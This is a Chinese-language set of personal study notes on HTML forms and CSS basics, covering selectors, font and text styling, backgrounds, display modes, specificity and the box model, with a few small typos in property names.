<h3 id="会员注册"><a href="#会员注册" class="headerlink" title="会员注册"></a>会员注册</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">&lt;h1&gt;青春不常在，抓紧谈恋爱&lt;/h1&gt;</span><br><span class="line">&lt;hr /&gt;</span><br><span class="line">昵称：</span><br><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;请输入昵称&quot; /&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">性别：</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;gender&quot; /&gt;女&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;gender&quot; /&gt;男&lt;/label&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">生日：</span><br><span class="line">&lt;input type=&quot;date&quot; /&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">城市：</span><br><span class="line">&lt;select&gt;</span><br><span class="line">&lt;option&gt;北京&lt;/option&gt;</span><br><span class="line">&lt;option&gt;上海&lt;/option&gt;</span><br><span class="line">&lt;option&gt;广州&lt;/option&gt;</span><br><span class="line">&lt;option&gt;深圳&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">婚姻状况：</span><br><span class="line">&lt;label&gt; &lt;input type=&quot;radio&quot; name=&quot;marry&quot; checked /&gt;未婚&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;marry&quot; /&gt;离异&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;marry&quot; /&gt;保密&lt;/label&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">兴趣爱好：</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;checkbox&quot; /&gt;追剧&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;checkbox&quot; /&gt;看书&lt;/label&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;checkbox&quot; /&gt;运动&lt;/label&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">个人介绍：</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;textarea cols=&quot;50&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;h2&gt;我承诺：&lt;/h2&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;年满十八岁，单身&lt;/li&gt;</span><br><span class="line">&lt;li&gt;抱着严肃的态度&lt;/li&gt;</span><br><span class="line">&lt;li&gt;真诚寻找另一半&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;label&gt;&lt;input type=&quot;radio&quot; /&gt;我同意以上条款&lt;/label&gt;</span><br><span class="line">&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot;&gt;免费注册&lt;/button&gt;</span><br><span class="line">&lt;button type=&quot;reset&quot;&gt;重置&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<h1 id="CSS初识"><a href="#CSS初识" class="headerlink" title="CSS初识"></a>CSS初识</h1><h2 id="基础认知"><a href="#基础认知" class="headerlink" title="基础认知"></a>基础认知</h2><p>CSS(Cascading Style Sheets):层叠样式表<br>用于给页面中的HTML标签设置样式，一般写在<code>&lt;style&gt;&lt;/style&gt;</code>标签中，位于<code>&lt;head&gt;&lt;/head&gt;</code>内,<code>&lt;title&gt;&lt;/title&gt;</code>标签下。<br>常见属性：</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>color</td>
<td>文字颜色</td>
</tr>
<tr>
<td>font-size</td>
<td>字体大小</td>
</tr>
<tr>
<td>background-color</td>
<td>背景颜色</td>
</tr>
<tr>
<td>width</td>
<td>宽度</td>
</tr>
<tr>
<td>height</td>
<td>高度</td>
</tr>
</tbody></table>
<p>注意：CSS标点符号必须是英文，每一个样式键值对写完都必须用<strong>分号</strong>结束</p>
<h3 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h3><p>内嵌式：写在style标签中，style标签可以写在页面任意位置，但一般在head标签中title标签下<br>外联式：写在一个单独的.css文件下，通过link标签在网页中引入，记得先保存css文件<br>行内式：写在标签的style属性中，建议和js一起使用</p>
<h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515181944.png"></p>
<h3 id="标签选择器：a-p…"><a href="#标签选择器：a-p…" class="headerlink" title="标签选择器：a,p…"></a>标签选择器：a,p…</h3><p>结构：<strong>标签名</strong>{CSS属性名:属性值;CSS属性名:属性值;……}<br>示例:</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line">    <span class="attribute">color</span>:red</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：标签选择器选择的是一类标签而不是单独的某一个，无论有几层标签嵌套都能定位到标签。</p>
<h3 id="类选择器：-classname"><a href="#类选择器：-classname" class="headerlink" title="类选择器：.classname"></a>类选择器：.classname</h3><p>结构：**.类名**(即class属性值){CSS属性名:属性值;…}<br>作用：对页面中所有带有此类名(即class属性值相等)的标签设置样式<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.red&#123;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>所有标签都有class属性，其值即类名；</li>
<li>类名可由数字、字母、下划线、中划线组成，但不能以数字或中划线开始；</li>
<li>一个标签可以有多个类名，之间以空格分开；</li>
<li>一个类选择器可以选中多个多种标签；</li>
<li>多个类名时以<code>&lt;style&gt;</code>里面最后一个为主</li>
</ul>
<h3 id="Id选择器-id"><a href="#Id选择器-id" class="headerlink" title="Id选择器 #id"></a>Id选择器 #id</h3><p>结构：**#id属性值**{CSS属性名:属性值;…}<br>作用：对页面中<em>那一个</em>id属性值符合的标签设置样式<br>示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#red&#123;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>所有标签都有id属性</li>
<li>每个id属性值只能给一个标签，即某一个标签与某个id属性值一一对应，类似身份证，不可重复</li>
<li>一个id选择器只能选中一个标签</li>
<li>标签&lt;类&lt;\ID，某标签符合多个时，按此顺序服从，即优先采用id选择器设置的样式</li>
</ul>
<p>补充：类和id的区别</p>
<ul>
<li>class类名类似昵称，可以重复，一个标签可以有多个类名</li>
<li>id类似身份证号，不可重复，一个标签只能有一个</li>
<li>id一般配合js使用，尽量少用</li>
</ul>
<h3 id="通配符选择器"><a href="#通配符选择器" class="headerlink" title="通配符选择器 *"></a>通配符选择器 *</h3><p>结构：<strong>*</strong>{CSS属性名:属性值;…}<br>作用：对页面中<em>所有标签</em>设置样式<br>注意：极少使用</p>
<h3 id="后代选择器"><a href="#后代选择器" class="headerlink" title="后代选择器"></a>后代选择器</h3><p>语法：选择器1 选择器2{CSS}<br>结果：在选择器1所找到的标签的后代(子孙)中找到满足选择器2的标签<br>注意：选择器之间以空格分开</p>
<h3 id="子代选择器-（只包含子辈不包含孙及孙后）"><a href="#子代选择器-（只包含子辈不包含孙及孙后）" class="headerlink" title="子代选择器 &gt; （只包含子辈不包含孙及孙后）"></a>子代选择器 &gt; （只包含子辈不包含孙及孙后）</h3><p>语法：选择器1 &gt; 选择器2{CSS}<br>结果：在选择器1所找到的标签的子代中找到满足选择器2的标签</p>
<h3 id="并集选择器"><a href="#并集选择器" class="headerlink" title="并集选择器 ,"></a>并集选择器 ,</h3><p>语法：选择器1 , 选择器2{CSS}<br>结果：找到选择器1和选择器2任一个的标签<br>注意：</p>
<ul>
<li>并集选择器中每组选择器可以是基础选择器和复合选择器</li>
<li>每组选择器通常一行写一个，提高代码可读性</li>
</ul>
<h3 id="交集选择器"><a href="#交集选择器" class="headerlink" title="交集选择器"></a>交集选择器</h3><p>语法：选择器1选择器2{CSS}<br>结果：找到既满足选择器1又满足选择器2的标签<br>注意：</p>
<ul>
<li>交集选择器标签必须写在最前面</li>
<li>必须紧挨着不能分隔</li>
<li>如果有标签选择器，标签选择器必须写在最开始</li>
</ul>
<h3 id="emmet语法"><a href="#emmet语法" class="headerlink" title="emmet语法"></a>emmet语法</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515181655.png"><br>vs中没有，vscode有</p>
<h3 id="hover伪类选择器"><a href="#hover伪类选择器" class="headerlink" title="hover伪类选择器"></a>hover伪类选择器</h3><p>语法：选择器:hover{CSS}<br>结果：选中鼠标悬停在元素上的状态，设置样式<br>注意：选中的是状态！可以实现鼠标悬停时变色等效果</p>
<h3 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h3><p>存在属性选择器：选择具有指定属性的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有具有&quot;target&quot;属性的元素 */</span>  </span><br><span class="line"><span class="selector-attr">[target]</span> &#123;  </span><br><span class="line">    <span class="attribute">background-color</span>: yellow;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>等于属性值选择器：选择属性值等于指定值的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有&quot;href&quot;属性值等于&quot;https://example.com&quot;的&lt;a&gt;元素 */</span>  </span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[href=<span class="string">&quot;https://example.com&quot;</span>]</span> &#123;  </span><br><span class="line">    <span class="attribute">color</span>: red;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>包含属性值选择器：选择属性值包含指定字符串的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有&quot;class&quot;属性值包含&quot;highlight&quot;的元素 */</span>  </span><br><span class="line"><span class="selector-attr">[class*=<span class="string">&quot;highlight&quot;</span>]</span> &#123;  </span><br><span class="line">    <span class="attribute">background-color</span>: lightyellow;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开始属性值选择器：选择属性值以指定字符串开始的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有&quot;id&quot;属性值以&quot;prefix-&quot;开始的元素 */</span>  </span><br><span class="line"><span class="selector-attr">[id^=<span class="string">&quot;prefix-&quot;</span>]</span> &#123;  </span><br><span class="line">    <span class="attribute">font-weight</span>: bold;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结束属性值选择器：选择属性值以指定字符串结束的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有&quot;filename&quot;属性值以&quot;.jpg&quot;结束的元素 */</span>  </span><br><span class="line"><span class="selector-attr">[filename$=<span class="string">&quot;.jpg&quot;</span>]</span> &#123;  </span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>包含空格分隔的属性值选择器：选择属性值中由空格分隔的列表中包含指定词的元素。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有&quot;rel&quot;属性值中包含&quot;nofollow&quot;的&lt;a&gt;元素 */</span>  </span><br><span class="line"><span class="selector-tag">a</span><span class="selector-attr">[rel~=<span class="string">&quot;nofollow&quot;</span>]</span> &#123;  </span><br><span class="line">    <span class="attribute">text-decoration</span>: none;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>指定属性选择器：选择具有指定属性名的元素，而不考虑其值。这实际上与存在属性选择器相同，但使用了更明确的语法。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择所有具有&quot;data-role&quot;属性的元素 */</span>  </span><br><span class="line"><span class="selector-attr">[data-role]</span> &#123;  </span><br><span class="line">    <span class="comment">/* 样式 */</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>选中所有勾选的选择框：元素:checked</p>
<h2 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h2><h3 id="字体大小-粗细-样式-倾斜-font-size"><a href="#字体大小-粗细-样式-倾斜-font-size" class="headerlink" title="字体大小 粗细 样式(倾斜)font-size"></a>字体大小 粗细 样式(倾斜)font-size</h3><table>
<thead>
<tr>
<th>属性名</th>
<th>取值</th>
<th>注意</th>
</tr>
</thead>
<tbody><tr>
<td>font-size</td>
<td>数字+px</td>
<td>谷歌默认16px,必须有单位</td>
</tr>
<tr>
<td>font-weight</td>
<td>100~900的整百数(400,700) <br>或：正常:normal 加粗:bold</td>
<td>不是使用字体都提供了9种粗细，一般用normal&#x2F;bold</td>
</tr>
<tr>
<td>font-style</td>
<td>normal&#x2F;italic</td>
<td></td>
</tr>
</tbody></table>
<h3 id="字体系列-font-family"><a href="#字体系列-font-family" class="headerlink" title="字体系列 font-family"></a>字体系列 font-family</h3><p>常见字体系列(了解)</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>特点</th>
<th>应用场景</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td>无衬线字体</td>
<td>文字笔画粗细均匀，首尾无装饰</td>
<td>网页大多使用</td>
<td>黑体，Arial</td>
</tr>
<tr>
<td>衬线字体</td>
<td>文字笔画粗细不均，首尾有笔锋</td>
<td>报刊书籍</td>
<td>宋体，times new roman</td>
</tr>
<tr>
<td>等宽字体</td>
<td>每一个字母或文字宽度相等</td>
<td>程序代码</td>
<td>Consolas,fira code</td>
</tr>
</tbody></table>
<p>格式：font-family:字体1，字体2<br>注意：从左往右按顺序查找，电脑未安装字体，显示下一个，若均未安装，根据系统显示默认字体：微软雅黑和MACOS的苹方，若字体名字由多个单词组成，建议使用引号包裹，但最后一个不需要。应当尽可能使用默认字体。</p>
<p><strong>样式的层叠</strong>给同一个标签设置了相同的样式，写在最下面的生效。</p>
<h3 id="字体属性连写-font"><a href="#字体属性连写-font" class="headerlink" title="字体属性连写 font"></a>字体属性连写 font</h3><p>格式：font:style weight size family;(简称swsf稍微舒服)<br>注释：</p>
<ul>
<li>只能省略style weight</li>
<li>如果需要同时设置连写和单独形式，单独必须在连写里面或者下面</li>
</ul>
<h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><p>缩进,对齐,修饰,行高</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>取值</th>
<th>注意</th>
</tr>
</thead>
<tbody><tr>
<td>text_indent</td>
<td>数字+px<br>数字+em</td>
<td>文本缩进,1em等于当前标签font-size的大小</td>
</tr>
<tr>
<td>text-align</td>
<td>left:左对齐<br>center:居中对齐<br>right:右对齐</td>
<td>操作对象:文本,span,a,input,img</td>
</tr>
<tr>
<td>text-decoration</td>
<td>下划线:underline<br>删除线:line-through<br>上划线:overline<br>无装饰线:none</td>
<td>none可用于清除a标签默认的下划线</td>
</tr>
<tr>
<td>line-height</td>
<td>数字+px<br>倍数(当前标签的font-size的)</td>
<td>同时设置了行高和font连写，可能覆盖 size&#x2F;line-height</td>
</tr>
<tr>
<td>注意：</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>text-align让以上元素水平居中时，给其的父元素设置</li>
<li>单行文本垂直居中可以设置line-height:文字父元素高度</li>
<li>网页精准布局时会设置line-height:1取消上下间距</li>
</ul>
<h2 id="颜色的常见取值"><a href="#颜色的常见取值" class="headerlink" title="颜色的常见取值"></a>颜色的常见取值</h2><p>属性名：</p>
<ul>
<li>文字颜色:color</li>
<li>背景颜色:background-color<br>属性值：<table>
<thead>
<tr>
<th>颜色表示方式</th>
<th>表示涵义</th>
<th>属性值</th>
</tr>
</thead>
<tbody><tr>
<td>关键词</td>
<td>预定义的颜色名</td>
<td>red,green,blue</td>
</tr>
<tr>
<td>rgb表示法</td>
<td>红绿蓝三原色,每项取值:0-255</td>
<td>rgb(0,0,0)</td>
</tr>
<tr>
<td>rgbd表示法</td>
<td>红绿蓝三原色+a透明度,取值分为0-1</td>
<td>rgba(255,255,255,0.5)</td>
</tr>
<tr>
<td>十六进制表示法</td>
<td>#开头,将数组转换为十六进制表示</td>
<td>#000000,#ff000000</td>
</tr>
</tbody></table>
</li>
</ul>
<p>说明：</p>
<ul>
<li>rgb(255,0,0) 红色</li>
<li>rgb(0,255,0) 绿色</li>
<li>rgb(0,0,255) 蓝色</li>
<li>透明度：0完全透明 1完全不透明</li>
<li>十六进制表示法下，每两位数字为一组，若每一组数字分别相同，可以略写为一位，例如#ffffff-&gt;#fff</li>
</ul>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="背景颜色background-color"><a href="#背景颜色background-color" class="headerlink" title="背景颜色background-color"></a>背景颜色background-color</h3><p>属性名：background-color<br>属性值：关键字，rgb,rgba,十六进制<br>注意点：</p>
<ul>
<li>默认值是透明rgba(0,0,0,0)、transparent</li>
<li>一般先设置</li>
</ul>
<h3 id="背景图片background-image-background-repeat（平铺）"><a href="#背景图片background-image-background-repeat（平铺）" class="headerlink" title="背景图片background-image background-repeat（平铺）"></a>背景图片background-image background-repeat（平铺）</h3><p>属性名：background-image<br>属性值：url(‘图片路径’);<br>注意：url中可以省略一号，默认水平和垂直平铺，仅仅起到装饰作用，不能撑开盒子</p>
<p>属性名：background-repeat<br>属性值：</p>
<table>
<thead>
<tr>
<th>取值</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>repeat</td>
<td>水平和垂直方向都平铺</td>
</tr>
<tr>
<td>no-repeat</td>
<td>不平铺</td>
</tr>
<tr>
<td>repeat-x</td>
<td>沿水平方向平铺</td>
</tr>
<tr>
<td>repeat-y</td>
<td>沿竖直方向平铺</td>
</tr>
</tbody></table>
<h3 id="背景位置background-position"><a href="#背景位置background-position" class="headerlink" title="背景位置background-position"></a>背景位置background-position</h3><p>属性名：background-position<br>属性值：水平方向位置 垂直方向位置<br>方位名词:</p>
<ul>
<li>水平方向：left center right </li>
<li>竖直方向：top center bottom<br>数字+px:<br>以盒子左上角为原点，x轴水平向右，y轴垂直向下，图片左上角与坐标点重合<br>注意：方位词和坐标取值可以混合使用</li>
</ul>
<h3 id="背景相关属性的连写background"><a href="#背景相关属性的连写background" class="headerlink" title="背景相关属性的连写background"></a>背景相关属性的连写background</h3><p>书写顺序：color image repeat position</p>
<h2 id="元素显示模式（行内块）"><a href="#元素显示模式（行内块）" class="headerlink" title="元素显示模式（行内块）"></a>元素显示模式（行内块）</h2><h3 id="块级元素display-block"><a href="#块级元素display-block" class="headerlink" title="块级元素display:block"></a>块级元素display:block</h3><p>属性：display:block<br>显示特点：独占一行，宽度默认为父元素宽度，高度默认由内容撑开，可以设置宽高 代表标签：div,p,h,ul,li,dl,dt,dd,form,header…</p>
<p>查看属性的方法，在检查中的styles</p>
<h3 id="行内元素display-inline"><a href="#行内元素display-inline" class="headerlink" title="行内元素display:inline"></a>行内元素display:inline</h3><p>属性：display:inline<br>显示特点:一行显示多个，高宽默认由内容撑开，不可设置。<br>代表标签：a,span,b,u,i,s,strong,ins,em,del …</p>
<h3 id="行内块元素display-inline-block"><a href="#行内块元素display-inline-block" class="headerlink" title="行内块元素display:inline-block"></a>行内块元素display:inline-block</h3><p>属性：display:inline-block<br>显示特点：一行显示多个，可以设置宽高<br>代表标签：input,textarea,button,select…</p>
<h3 id="元素显示模式的转换"><a href="#元素显示模式的转换" class="headerlink" title="元素显示模式的转换"></a>元素显示模式的转换</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515190612.png"></p>
<p>在标签的style里增加属性display</p>
<h3 id="html嵌套规范"><a href="#html嵌套规范" class="headerlink" title="html嵌套规范"></a>html嵌套规范</h3><p>块元素一般作为大容器，可以嵌套：文本，块级元素，行内元素，行内块元素，但P标签中不要嵌套div p h 等块级元素<br>a标签内部可以嵌套任意元素，但不能嵌套阿标签</p>
<h3 id="居中方法总结"><a href="#居中方法总结" class="headerlink" title="居中方法总结"></a>居中方法总结</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515190930.png"></p>
<h2 id="CSS的三大特性：继承性层叠性优先级"><a href="#CSS的三大特性：继承性层叠性优先级" class="headerlink" title="CSS的三大特性：继承性层叠性优先级"></a>CSS的三大特性：继承性层叠性优先级</h2><h3 id="继承性"><a href="#继承性" class="headerlink" title="继承性"></a>继承性</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515190959.png"><br> <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515191014.png"></p>
<p>可以减少代码<br>应用场景：</p>
<ul>
<li>为ul设置list-style:none，去除列表默认小圆点</li>
<li>直接给body标签设置统一的font-size，从而统一不同浏览器默认文字大小</li>
</ul>
<p><em>继承的失效</em><br>如果元素有浏览器默认样式，继承性任存在，但优先显示默认样式；a标签的color，h系列标签的font-size,div的高度会继承失效</p>
<h3 id="层叠性"><a href="#层叠性" class="headerlink" title="层叠性"></a>层叠性</h3><p>特性：</p>
<ul>
<li>给同一个标签设置不同的样式，样式会层叠叠加共同作用</li>
<li>给同一个标签设置相同的样式，样式会层叠覆盖，写在最后的样式会生效</li>
<li><strong>样式冲突时只有选择器优先级相同才能通过层叠性判断结果，优先级不同时按选择器优先级生效</strong></li>
</ul>
<p>（相同样式即相同属性不同值）<br>（上述是对同一优先级的选择器而言的，优先级不同时按选择器优先级生效）</p>
<h3 id="优先级-及-important"><a href="#优先级-及-important" class="headerlink" title="优先级 及 !important"></a>优先级 及 !important</h3><p><strong>优先级公式：</strong><br><code>继承&lt;通配符选择器&lt;标签选择器&lt;类选择器&lt;id选择器&lt;行内样式&lt;!important</code></p>
<p>!important 写在属性值后面，分号之前，不能提高继承的优先级，只要是继承优先级最低，实际开发中不建议使用！</p>
<p><strong>权重叠加计算</strong><br>复合选择器按权重叠加计算，判断哪个选择器优先级最高<br>公式：<br>    (0(第一级:行内样式个数),0(第二级:id选择器个数),0(第三级:类选择器个数),0(第四级:标签选择器))<br>比较规则：</p>
<ul>
<li>先比较第一级，有结果其余不用参考</li>
<li>第一级相同，比较第二级，有结果其余不用参考….</li>
<li>如果所有数字相同，则按层叠性</li>
<li>！important若不是继承，优先级最高！</li>
</ul>
<h3 id="样式查错（样式无法出现）"><a href="#样式查错（样式无法出现）" class="headerlink" title="样式查错（样式无法出现）"></a>样式查错（样式无法出现）</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240515191407.png"></p>
<h3 id="PXcook的使用（用于根据设计图制作网页）"><a href="#PXcook的使用（用于根据设计图制作网页）" class="headerlink" title="PXcook的使用（用于根据设计图制作网页）"></a>PXcook的使用（用于根据设计图制作网页）</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240516211419.png"></p>
<h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><p>盒子实际大小&#x3D;内容区域大小+内边距大小+边框大小<br>盒子：</p>
<ul>
<li>页面中的每一个标签，都可看做一个“盒子”，通过盒子的视角更方便布局</li>
<li>浏览器在渲染（显示）网页时，会将网页中的元素视为一个个矩形区域，也称之为盒子</li>
<li>CSS中规定每个盒子由：内容区域，内边距区域，边框区域，外边距区域构成</li>
</ul>
<h3 id="内容的宽度和高度"><a href="#内容的宽度和高度" class="headerlink" title="内容的宽度和高度"></a>内容的宽度和高度</h3><p>width属性和height属性默认设置的时盒子的内容区域大小，设置方法见上文</p>
<h3 id="边框border"><a href="#边框border" class="headerlink" title="边框border"></a>边框border</h3><p>作用：<br>属性：</p>
<table>
<thead>
<tr>
<th>属性名</th>
<th>作用</th>
<th>属性值</th>
</tr>
</thead>
<tbody><tr>
<td>border-width</td>
<td>边框粗细</td>
<td>数字+px</td>
</tr>
<tr>
<td>border-style</td>
<td>边框样式</td>
<td>solid:实线,dashed:虚线,dotted:点线</td>
</tr>
<tr>
<td>border-color</td>
<td>边框颜色</td>
<td>颜色取值</td>
</tr>
<tr>
<td>border</td>
<td>单个取值连写，取值之间用空格分开</td>
<td>border:10px solid red</td>
</tr>
<tr>
<td>border-方向</td>
<td>只设置某个方向的边框</td>
<td>同border</td>
</tr>
</tbody></table>
<p>left,right,top,bottom<br>如果子盒子没有设置宽度，宽度默认为父盒子宽度，此时设置子盒子左右的padding或border不会撑大盒子。</p>
<h3 id="内边距padding内容与边框的距离"><a href="#内边距padding内容与边框的距离" class="headerlink" title="内边距padding内容与边框的距离"></a>内边距padding内容与边框的距离</h3><p>作用：设置边框和内容区域之间的距离<br>属性名：padding<br>常见取值：</p>
<table>
<thead>
<tr>
<th>取值</th>
<th>示例</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>一个</td>
<td>padding:10px</td>
<td>上下左右均为10px</td>
</tr>
<tr>
<td>两个</td>
<td>padding:10px 20px</td>
<td>上下为10px,左右为20px</td>
</tr>
<tr>
<td>三个</td>
<td>padding:10px 20px 30px</td>
<td>上10px,左右20px,下30px</td>
</tr>
<tr>
<td>四个</td>
<td>padding:10px 20px 30px 40px</td>
<td>上10右20下30左40</td>
</tr>
</tbody></table>
<p>即从上开始赋值，顺时针赋值，没有赋值的同对面<br>若只给某个方向赋值，使用padding-方位名词，取值为数字+px<br>对所有的盒子生效.box</p>
<h3 id="自动内减"><a href="#自动内减" class="headerlink" title="自动内减"></a>自动内减</h3><p>box-sizing:border-box;</p>
<h3 id="外边距margin盒子与盒子的间距"><a href="#外边距margin盒子与盒子的间距" class="headerlink" title="外边距margin盒子与盒子的间距"></a>外边距margin盒子与盒子的间距</h3><p>作用:设置边框以外，盒子与盒子之间的距离<br>属性名:margin<br>常见取值:与padding相同<br>记忆规则:从上开始赋值，然后顺时针赋值，如果设置赋值的，看对面的!!</p>
<p>若只给某个方向单独设置外边距，方法同padding,margin-方位名词。<br>应用：</p>
<table>
<thead>
<tr>
<th>方向</th>
<th>属性</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td>水平方向</td>
<td>margin-left</td>
<td>让当前盒子往右移动</td>
</tr>
<tr>
<td>水平方向</td>
<td>margin.right</td>
<td>让右边的盒子往右移动</td>
</tr>
<tr>
<td>垂直方向</td>
<td>margin-top</td>
<td>往当前盒子往下移动</td>
</tr>
<tr>
<td>垂直方向</td>
<td>margin-bottom</td>
<td>让下面的盒子往下移动</td>
</tr>
</tbody></table>
<h3 id="清除默认边距"><a href="#清除默认边距" class="headerlink" title="清除默认边距"></a>清除默认边距</h3><p>场景:浏览器会默认给部分标签设置默认的margin和padding，但一般在项目开始前需要先清除这些标签默认的margin和padding，后续自己设置</p>
<ul>
<li>比如:body标签默认有margin:8px</li>
<li>比如:p标签默认有上下的margin</li>
<li>比如:ul标签默认由上下的margin和padding-left<br>解决方法:可以使用通配符 *</li>
</ul>
<h3 id="外边距margin"><a href="#外边距margin" class="headerlink" title="外边距margin"></a>外边距margin</h3><p>1、水平不合并<br>水平布局的盒子左右margin正常，互不影响，二者距离为左右margin之和<br>2、垂直块元素合并（以最大值为准<br>垂直布局的块级元素，上下margin合并，距离为二者最大者。<br>3、嵌套块元素<br>场景:互相嵌套的块级元素，子元素的 margin-top 会作用在父元素上<br>结果:导致父元素一起往下移动<br>解决方法:</p>
<ul>
<li>给父元素设置border-top或者 padding-top(分隔父子元素的margin-top)</li>
<li>给父元素设置overflow:hidden</li>
<li>转换成行内块元素</li>
<li>设置浮动<br>4、 无效情况<br>当给行内元素设置margin和padding时，水平方向的有效，垂直方向无效</li>
</ul>
<h2 id="伪类选择器，标准流，浮动"><a href="#伪类选择器，标准流，浮动" class="headerlink" title="伪类选择器，标准流，浮动"></a>伪类选择器，标准流，浮动</h2><h3 id="结构伪类选择器"><a href="#结构伪类选择器" class="headerlink" title="结构伪类选择器"></a>结构伪类选择器</h3><p>作用:根据元素在HTML中的结构关系查找元素<br>优势:减少对于HTML中类的依赖，有利于保持代码整洁<br>场景:常用于查找某父级选择器中的子元素</p>
<table>
<thead>
<tr>
<th>选择器</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>E:first-chi1dl{}</td>
<td>匹配父元素中第一个子元素。并且是E元素</td>
</tr>
<tr>
<td>E:1ast-chi1d{}</td>
<td>区配父元素中最后一个子元素，并且是E元素</td>
</tr>
<tr>
<td>E:nth-child(n){}</td>
<td>匹配父元素中第n个子元素，并且是E元素</td>
</tr>
<tr>
<td>E:nth.1ast-child(n){}</td>
<td>区配父元素中倒数第n个子元素，并且是E元素</td>
</tr>
<tr>
<td>E:nth-of-type(n){}</td>
<td>旨在父元素同类型(E)子元素范围内匹配第n个</td>
</tr>
<tr>
<td>n的注意点：</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>n为1，2，3，4，…</li>
<li>通过n可以组成公式:奇数2n+1,2n-1,odd;偶数2n,even;前五个-n+5;从第五个往后找n+5;</li>
</ul>
